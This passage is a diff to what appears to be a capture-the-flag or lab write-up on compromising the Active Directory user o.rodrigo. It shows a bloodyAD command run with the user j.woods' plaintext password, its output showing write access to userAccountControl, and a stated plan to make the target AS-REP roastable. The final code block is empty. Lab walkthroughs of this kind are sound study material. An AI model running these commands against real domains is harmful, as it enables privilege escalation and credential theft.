@@ -476,4 +476,19 @@ So i have access as `j.woods` and also for `d.goggins` but theyve got restricted
 
 # Compromising `o.rodrigo`
 
-So since i cant really use `d.gogins` yet, i can check what access
+So since i cant really use `d.gogins` yet, i can check what access `j.woods` has got
+
+```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u 'j.woods' -p 'hpFqULtQoY!' get writable --detail
+
+distinguishedName: CN=Olivia OR. Rodrigo,CN=Users,DC=fragments,DC=local
+userAccountControl: WRITE
+
+...[SNIP]...
+```
+
+This user has write access on this user, this means i should be able to make this user AS-REP roastable
+
+```python
+
+```
